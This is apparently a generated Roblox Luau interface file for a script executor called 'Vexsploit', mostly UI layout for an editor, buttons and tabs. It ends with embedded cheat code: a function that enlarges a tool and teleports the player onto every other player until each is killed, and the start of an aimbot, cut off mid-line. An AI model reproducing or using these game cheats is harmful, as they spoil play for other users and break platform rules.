-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Code.LocalScript
G2L["44"] = Instance.new("LocalScript", G2L["42"]);



-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Highlight
G2L["45"] = Instance.new("TextLabel", G2L["3d"]);
G2L["45"]["BorderSizePixel"] = 0;
G2L["45"]["TextSize"] = 14;
G2L["45"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["45"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45"]["FontFace"] = Font.new([[rbxassetid://12187362578]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["45"]["TextColor3"] = Color3.fromRGB(205, 205, 205);
G2L["45"]["BackgroundTransparency"] = 1;
G2L["45"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["Text"] = [[]];
G2L["45"]["AutomaticSize"] = Enum.AutomaticSize.XY;
G2L["45"]["Name"] = [[Highlight]];
G2L["45"]["Position"] = UDim2.new(0.05568, 0, -0, 0);


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Highlight.UIPadding
G2L["46"] = Instance.new("UIPadding", G2L["45"]);
G2L["46"]["PaddingLeft"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Handler
G2L["47"] = Instance.new("LocalScript", G2L["3d"]);
G2L["47"]["Name"] = [[Handler]];


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Handler.Highlighter
G2L["48"] = Instance.new("ModuleScript", G2L["47"]);
G2L["48"]["Name"] = [[Highlighter]];


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Handler.Highlighter.lexer
G2L["49"] = Instance.new("ModuleScript", G2L["48"]);
G2L["49"]["Name"] = [[lexer]];


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Handler.Highlighter.lexer.language
G2L["4a"] = Instance.new("ModuleScript", G2L["49"]);
G2L["4a"]["Name"] = [[language]];


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Handler.Highlighter.theme
G2L["4b"] = Instance.new("ModuleScript", G2L["48"]);
G2L["4b"]["Name"] = [[theme]];


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Handler.Highlighter.types
G2L["4c"] = Instance.new("ModuleScript", G2L["48"]);
G2L["4c"]["Name"] = [[types]];


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.Handler.Highlighter.utility
G2L["4d"] = Instance.new("ModuleScript", G2L["48"]);
G2L["4d"]["Name"] = [[utility]];


-- Workspace.Vexsploit.MainFrame.Executor1.CodeEditor.UICorner
G2L["4e"] = Instance.new("UICorner", G2L["3d"]);
G2L["4e"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons
G2L["4f"] = Instance.new("Frame", G2L["3a"]);
G2L["4f"]["BorderSizePixel"] = 0;
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["Size"] = UDim2.new(0, 1085, 0, 67);
G2L["4f"]["Position"] = UDim2.new(0.01485, 0, 0.90895, 0);
G2L["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["Name"] = [[Buttons]];
G2L["4f"]["BackgroundTransparency"] = 1;


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Exec
G2L["50"] = Instance.new("TextButton", G2L["4f"]);
G2L["50"]["TextWrapped"] = true;
G2L["50"]["BorderSizePixel"] = 0;
G2L["50"]["TextSize"] = 20;
G2L["50"]["TextColor3"] = Color3.fromRGB(192, 152, 153);
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["50"]["BackgroundTransparency"] = 0.7;
G2L["50"]["Size"] = UDim2.new(0, 242, 0, 46);
G2L["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["Text"] = [[Execute]];
G2L["50"]["Name"] = [[Exec]];


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Exec.UICorner
G2L["51"] = Instance.new("UICorner", G2L["50"]);
G2L["51"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Exec.UIStroke
G2L["52"] = Instance.new("UIStroke", G2L["50"]);
G2L["52"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["52"]["Thickness"] = 2.5;
G2L["52"]["Color"] = Color3.fromRGB(137, 109, 109);


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Exec.LocalScript
G2L["53"] = Instance.new("LocalScript", G2L["50"]);



-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.UIPadding
G2L["54"] = Instance.new("UIPadding", G2L["4f"]);
G2L["54"]["PaddingTop"] = UDim.new(0, 7);


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.UIListLayout
G2L["55"] = Instance.new("UIListLayout", G2L["4f"]);
G2L["55"]["Padding"] = UDim.new(0, 7);
G2L["55"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["55"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Clear
G2L["56"] = Instance.new("TextButton", G2L["4f"]);
G2L["56"]["TextWrapped"] = true;
G2L["56"]["BorderSizePixel"] = 0;
G2L["56"]["TextSize"] = 20;
G2L["56"]["TextColor3"] = Color3.fromRGB(192, 192, 192);
G2L["56"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["56"]["BackgroundTransparency"] = 0.7;
G2L["56"]["Size"] = UDim2.new(0, 182, 0, 46);
G2L["56"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["56"]["Text"] = [[Clear]];
G2L["56"]["Name"] = [[Clear]];
G2L["56"]["Position"] = UDim2.new(0.41639, 0, 0, 0);


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Clear.UICorner
G2L["57"] = Instance.new("UICorner", G2L["56"]);
G2L["57"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Clear.UIStroke
G2L["58"] = Instance.new("UIStroke", G2L["56"]);
G2L["58"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["58"]["Thickness"] = 1.5;
G2L["58"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Clear.LocalScript
G2L["59"] = Instance.new("LocalScript", G2L["56"]);



-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Save
G2L["5a"] = Instance.new("TextButton", G2L["4f"]);
G2L["5a"]["TextWrapped"] = true;
G2L["5a"]["BorderSizePixel"] = 0;
G2L["5a"]["TextSize"] = 20;
G2L["5a"]["TextColor3"] = Color3.fromRGB(192, 192, 192);
G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["5a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5a"]["BackgroundTransparency"] = 0.7;
G2L["5a"]["Size"] = UDim2.new(0, 156, 0, 46);
G2L["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5a"]["Text"] = [[Save Script]];
G2L["5a"]["Name"] = [[Save]];


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Save.UICorner
G2L["5b"] = Instance.new("UICorner", G2L["5a"]);
G2L["5b"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Save.UIStroke
G2L["5c"] = Instance.new("UIStroke", G2L["5a"]);
G2L["5c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["5c"]["Thickness"] = 1.5;
G2L["5c"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Open
G2L["5d"] = Instance.new("TextButton", G2L["4f"]);
G2L["5d"]["TextWrapped"] = true;
G2L["5d"]["BorderSizePixel"] = 0;
G2L["5d"]["TextSize"] = 20;
G2L["5d"]["TextColor3"] = Color3.fromRGB(192, 192, 192);
G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["5d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5d"]["BackgroundTransparency"] = 0.7;
G2L["5d"]["Size"] = UDim2.new(0, 156, 0, 46);
G2L["5d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5d"]["Text"] = [[Open Script]];
G2L["5d"]["Name"] = [[Open]];


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Open.UICorner
G2L["5e"] = Instance.new("UICorner", G2L["5d"]);
G2L["5e"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.Buttons.Open.UIStroke
G2L["5f"] = Instance.new("UIStroke", G2L["5d"]);
G2L["5f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["5f"]["Thickness"] = 1.5;
G2L["5f"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Executor1.OutputFrame
G2L["60"] = Instance.new("Frame", G2L["3a"]);
G2L["60"]["BorderSizePixel"] = 0;
G2L["60"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["60"]["Size"] = UDim2.new(0, 454, 0, 867);
G2L["60"]["Position"] = UDim2.new(1.00447, 0, -0, 0);
G2L["60"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["60"]["Name"] = [[OutputFrame]];
G2L["60"]["BackgroundTransparency"] = 1;


-- Workspace.Vexsploit.MainFrame.Executor1.OutputFrame.scroll
G2L["61"] = Instance.new("ScrollingFrame", G2L["60"]);
G2L["61"]["ZIndex"] = 9;
G2L["61"]["BorderSizePixel"] = 0;
G2L["61"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["61"]["TopImage"] = [[rbxassetid://185945953]];
G2L["61"]["MidImage"] = [[rbxassetid://185945953]];
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["61"]["Name"] = [[scroll]];
G2L["61"]["BottomImage"] = [[rbxassetid://185945953]];
G2L["61"]["Size"] = UDim2.new(0, 453, 0, 867);
G2L["61"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["61"]["ScrollBarThickness"] = 10;
G2L["61"]["BackgroundTransparency"] = 0.5;


-- Workspace.Vexsploit.MainFrame.Executor1.OutputFrame.scroll.UICorner
G2L["62"] = Instance.new("UICorner", G2L["61"]);
G2L["62"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.OutputFrame.outputUpdate
G2L["63"] = Instance.new("Script", G2L["60"]);
G2L["63"]["Name"] = [[outputUpdate]];


-- Workspace.Vexsploit.MainFrame.Executor1.OutputFrame.outputUpdate.blankLine
G2L["64"] = Instance.new("TextLabel", G2L["63"]);
G2L["64"]["ZIndex"] = 10;
G2L["64"]["BorderSizePixel"] = 0;
G2L["64"]["TextSize"] = 18;
G2L["64"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["FontFace"] = Font.new([[rbxassetid://12187362578]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["64"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["64"]["BackgroundTransparency"] = 1;
G2L["64"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["64"]["Text"] = [[]];
G2L["64"]["Name"] = [[blankLine]];


-- Workspace.Vexsploit.MainFrame.Executor1.AutoExec
G2L["65"] = Instance.new("TextButton", G2L["3a"]);
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["TextSize"] = 18;
G2L["65"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["65"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["65"]["BackgroundTransparency"] = 0.7;
G2L["65"]["Size"] = UDim2.new(0, 140, 0, 32);
G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Text"] = [[Auto-execute (off)]];
G2L["65"]["Name"] = [[AutoExec]];
G2L["65"]["Position"] = UDim2.new(0.82979, -5, 0.01075, 0);


-- Workspace.Vexsploit.MainFrame.Executor1.AutoExec.UICorner
G2L["66"] = Instance.new("UICorner", G2L["65"]);
G2L["66"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.AutoExec.UIStroke
G2L["67"] = Instance.new("UIStroke", G2L["65"]);
G2L["67"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["67"]["Thickness"] = 1.5;
G2L["67"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Executor1.AutoExec.LocalScript
G2L["68"] = Instance.new("LocalScript", G2L["65"]);



-- Workspace.Vexsploit.MainFrame.Executor1.TopBar
G2L["69"] = Instance.new("Frame", G2L["3a"]);
G2L["69"]["BorderSizePixel"] = 0;
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["69"]["Size"] = UDim2.new(0, 852, 0, 32);
G2L["69"]["Position"] = UDim2.new(0.0143, 0, 0.01075, 0);
G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["Name"] = [[TopBar]];
G2L["69"]["BackgroundTransparency"] = 0.7;


-- Workspace.Vexsploit.MainFrame.Executor1.TopBar.TabButton1
G2L["6a"] = Instance.new("TextButton", G2L["69"]);
G2L["6a"]["BorderSizePixel"] = 0;
G2L["6a"]["TextSize"] = 18;
G2L["6a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["6a"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6a"]["BackgroundTransparency"] = 0.7;
G2L["6a"]["Size"] = UDim2.new(0, 57, 0, 25);
G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["Text"] = [[Tab 1]];
G2L["6a"]["Name"] = [[TabButton1]];


-- Workspace.Vexsploit.MainFrame.Executor1.TopBar.TabButton1.UICorner
G2L["6b"] = Instance.new("UICorner", G2L["6a"]);
G2L["6b"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.TopBar.TabButton1.UIStroke
G2L["6c"] = Instance.new("UIStroke", G2L["6a"]);
G2L["6c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6c"]["Thickness"] = 1.5;
G2L["6c"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Executor1.TopBar.TabButton1.Close
G2L["6d"] = Instance.new("TextButton", G2L["6a"]);
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["TextSize"] = 14;
G2L["6d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["6d"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6d"]["BackgroundTransparency"] = 0.7;
G2L["6d"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Text"] = [[X]];
G2L["6d"]["Name"] = [[Close]];
G2L["6d"]["Position"] = UDim2.new(1.10526, 0, 0, 0);


-- Workspace.Vexsploit.MainFrame.Executor1.TopBar.TabButton1.Close.UICorner
G2L["6e"] = Instance.new("UICorner", G2L["6d"]);
G2L["6e"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.TopBar.TabButton1.Close.UIStroke
G2L["6f"] = Instance.new("UIStroke", G2L["6d"]);
G2L["6f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6f"]["Thickness"] = 1.5;
G2L["6f"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Executor1.TopBar.TabButton1.Close.RemoveTab
G2L["70"] = Instance.new("LocalScript", G2L["6d"]);
G2L["70"]["Name"] = [[RemoveTab]];


-- Workspace.Vexsploit.MainFrame.Executor1.TopBar.UIStroke
G2L["71"] = Instance.new("UIStroke", G2L["69"]);
G2L["71"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["71"]["Thickness"] = 1.5;
G2L["71"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Executor1.TopBar.UIListLayout
G2L["72"] = Instance.new("UIListLayout", G2L["69"]);
G2L["72"]["Padding"] = UDim.new(0, 45);
G2L["72"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["72"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- Workspace.Vexsploit.MainFrame.Executor1.TopBar.UICorner
G2L["73"] = Instance.new("UICorner", G2L["69"]);
G2L["73"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.TopBar.UIPadding
G2L["74"] = Instance.new("UIPadding", G2L["69"]);
G2L["74"]["PaddingLeft"] = UDim.new(0, 3);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab
G2L["75"] = Instance.new("TextButton", G2L["3a"]);
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["TextSize"] = 14;
G2L["75"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["75"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["75"]["BackgroundTransparency"] = 0.7;
G2L["75"]["Size"] = UDim2.new(0, 28, 0, 28);
G2L["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["Text"] = [[+]];
G2L["75"]["Name"] = [[AddTab]];
G2L["75"]["Position"] = UDim2.new(0.77193, 9, 0.01306, 0);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.UICorner
G2L["76"] = Instance.new("UICorner", G2L["75"]);
G2L["76"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.UIStroke
G2L["77"] = Instance.new("UIStroke", G2L["75"]);
G2L["77"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["77"]["Thickness"] = 1.5;
G2L["77"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton
G2L["78"] = Instance.new("TextButton", G2L["75"]);
G2L["78"]["BorderSizePixel"] = 0;
G2L["78"]["TextSize"] = 18;
G2L["78"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["78"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["78"]["BackgroundTransparency"] = 0.7;
G2L["78"]["Size"] = UDim2.new(0, 57, 0, 25);
G2L["78"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["78"]["Text"] = [[Tab 1]];
G2L["78"]["Name"] = [[TabButton]];
G2L["78"]["Visible"] = false;


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.UICorner
G2L["79"] = Instance.new("UICorner", G2L["78"]);
G2L["79"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.UIStroke
G2L["7a"] = Instance.new("UIStroke", G2L["78"]);
G2L["7a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["7a"]["Thickness"] = 1.5;
G2L["7a"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.Close
G2L["7b"] = Instance.new("TextButton", G2L["78"]);
G2L["7b"]["BorderSizePixel"] = 0;
G2L["7b"]["TextSize"] = 14;
G2L["7b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["7b"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7b"]["BackgroundTransparency"] = 0.7;
G2L["7b"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["7b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7b"]["Text"] = [[X]];
G2L["7b"]["Name"] = [[Close]];
G2L["7b"]["Position"] = UDim2.new(1.10526, 0, 0, 0);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.Close.UICorner
G2L["7c"] = Instance.new("UICorner", G2L["7b"]);
G2L["7c"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.Close.UIStroke
G2L["7d"] = Instance.new("UIStroke", G2L["7b"]);
G2L["7d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["7d"]["Thickness"] = 1.5;
G2L["7d"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.Close.RemoveTab
G2L["7e"] = Instance.new("LocalScript", G2L["7b"]);
G2L["7e"]["Name"] = [[RemoveTab]];


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.LocalScript
G2L["7f"] = Instance.new("LocalScript", G2L["75"]);



-- Workspace.Vexsploit.MainFrame.Executor1.AddTab
G2L["80"] = Instance.new("TextButton", G2L["3a"]);
G2L["80"]["BorderSizePixel"] = 0;
G2L["80"]["TextSize"] = 14;
G2L["80"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["80"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["80"]["BackgroundTransparency"] = 0.7;
G2L["80"]["Size"] = UDim2.new(0, 32, 0, 32);
G2L["80"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["80"]["Text"] = [[+]];
G2L["80"]["Name"] = [[AddTab]];
G2L["80"]["Position"] = UDim2.new(0.95155, 4, 0.01075, 0);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.UICorner
G2L["81"] = Instance.new("UICorner", G2L["80"]);
G2L["81"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.UIStroke
G2L["82"] = Instance.new("UIStroke", G2L["80"]);
G2L["82"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["82"]["Thickness"] = 1.5;
G2L["82"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton
G2L["83"] = Instance.new("TextButton", G2L["80"]);
G2L["83"]["BorderSizePixel"] = 0;
G2L["83"]["TextSize"] = 18;
G2L["83"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["83"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["83"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["83"]["BackgroundTransparency"] = 0.7;
G2L["83"]["Size"] = UDim2.new(0, 57, 0, 25);
G2L["83"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["83"]["Text"] = [[Tab 1]];
G2L["83"]["Name"] = [[TabButton]];
G2L["83"]["Visible"] = false;


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.UICorner
G2L["84"] = Instance.new("UICorner", G2L["83"]);
G2L["84"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.UIStroke
G2L["85"] = Instance.new("UIStroke", G2L["83"]);
G2L["85"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["85"]["Thickness"] = 1.5;
G2L["85"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.Close
G2L["86"] = Instance.new("TextButton", G2L["83"]);
G2L["86"]["BorderSizePixel"] = 0;
G2L["86"]["TextSize"] = 14;
G2L["86"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(7, 7, 7);
G2L["86"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["86"]["BackgroundTransparency"] = 0.7;
G2L["86"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["Text"] = [[X]];
G2L["86"]["Name"] = [[Close]];
G2L["86"]["Position"] = UDim2.new(1.10526, 0, 0, 0);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.Close.UICorner
G2L["87"] = Instance.new("UICorner", G2L["86"]);
G2L["87"]["CornerRadius"] = UDim.new(0, 6);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.Close.UIStroke
G2L["88"] = Instance.new("UIStroke", G2L["86"]);
G2L["88"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["88"]["Thickness"] = 1.5;
G2L["88"]["Color"] = Color3.fromRGB(84, 67, 67);


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.TabButton.Close.RemoveTab
G2L["89"] = Instance.new("LocalScript", G2L["86"]);
G2L["89"]["Name"] = [[RemoveTab]];


-- Workspace.Vexsploit.MainFrame.Executor1.AddTab.LocalScript
G2L["8a"] = Instance.new("LocalScript", G2L["80"]);



-- Require G2L wrapper
local G2L_REQUIRE = require;
local G2L_MODULES = {};
local function require(Module:ModuleScript)
    local ModuleState = G2L_MODULES[Module];
    if ModuleState then
        if not ModuleState.Required then
            ModuleState.Required = true;
            ModuleState.Value = ModuleState.Closure();
        end
        return ModuleState.Value;
    end;
    return G2L_REQUIRE(Module);
end

G2L_MODULES[G2L["36"]] = {
Closure = function()
    local script = G2L["36"];local mod = {}

function mod:Example()

	-- a random script I made a while ago, kills everyone in a server when holding a sword (used as an example)
	-- equip sword first

	local tool;

	for _, v in next, game.Players.LocalPlayer.Character:GetDescendants() do
		if v:IsA("Tool") and v:FindFirstChild("Handle") then
			tool = v
			v.Handle.Size = Vector3.new(math.abs(9e9),math.abs(9e9),math.abs(9e9))
		end
	end

	local plr = game.Players.LocalPlayer

	while task.wait() do
		for _, v in next, game.Players.LocalPlayer.Backpack:GetDescendants() do
			if v:IsA("Tool") and v:FindFirstChild("Handle") then
				tool = v
				v.Handle.Size = Vector3.new(math.abs(9e9),math.abs(9e9),math.abs(9e9))
			end
		end
		for _, v in pairs(game.Players:GetChildren()) do
			if v.Name ~= plr.Name and v.Character.Humanoid.Health ~= 0 and not v.Character:FindFirstChild("ForceField") then
				repeat task.wait()
					if v.Name ~= plr.Name and v.Character.Humanoid.Health ~= 0 then
						tool:Activate()
						plr.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + Vector3.new(0,30,0)
					end
				until v.Character.Humanoid.Health == 0 
				print("just killed "..v.Name)
			end
		end
	end
end

function mod:aimbot()
	local runService = game:GetService("RunService")
	local plrsService = game:GetService("Players")
	local enabled = false
	local teamcheck = false
	local aimpart = "HumanoidRootPart"

	local key = Enum.KeyCode.B

	local gui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
	gui.ResetOnSpawn = false

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(0, 35, 0, 35)
	button.Position = UDim2.new(0, 0, 0.5, 0)
	button.AnchorPoint = Vector2.new(0, 0.5)
	button.BackgroundColor3 = Color3.new(1, 1, 1)
	button.Text = "T"
	button.TextSize = 14
	button.Parent = gui -- You can change the parent as needed

	local key

	button.MouseButton1Click:Connect(function()
		button.Text = "Press a key..."
		button.MouseButton1Click:Wait()

		key = Enum.KeyCode[game:GetService("UserInputService").InputBegan:Wait().KeyCode.Name]
		button.Text = key.Name
		game.StarterGui:SetCore("SendNotification", {
			Title = "Keybind Set",
			Text = "Keybind set to: " .. key.Name,
			Duration = 3
		})
	end)


	function lookAt(target, eye)
		workspace.CurrentCamera.CFrame = CFrame.new(target, eye)
	end

	function getClosestPlayerToCursor(trg_part)
		local nearest = nil
		local last = math.huge

		for i, v in ipairs(plrsService:GetPlayers()) do
			if v ~= plrsService.LocalPlayer and plrsService.LocalPlayer.Character and plrsService.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid") and plrsService.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Health > 0
